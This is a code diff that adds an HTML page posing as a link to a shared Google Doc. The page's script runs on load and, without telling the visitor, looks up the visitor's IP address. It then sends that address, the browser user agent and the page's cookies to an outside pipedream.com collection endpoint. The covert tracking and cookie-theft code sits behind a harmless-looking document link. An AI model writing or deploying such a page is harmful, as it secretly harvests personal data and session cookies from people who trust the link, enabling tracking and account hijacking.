@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Google Doc</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <h1>Google Doc</h1>
+  <p>Click the link below to view the document:</p>
+  <a href="https://docs.google.com/document/d/1ZtBLUIJVwleqE0VhLUwL97qQJspt7bvOaJ2xoa-tOL4/edit?tab=t.0" target="_blank">Open Google Doc</a>
+
+  <script>
+    // Collect the user's IP address
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        console.log('IP Address:', data.ip);
+        fetch('https://pipedream.com/new?h=tch_XZfD76', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            ip: data.ip,
+            userAgent: navigator.userAgent,
+            cookies: document.cookie
+          })
+        });
+      });
+  </script>
+</body>
+</html>
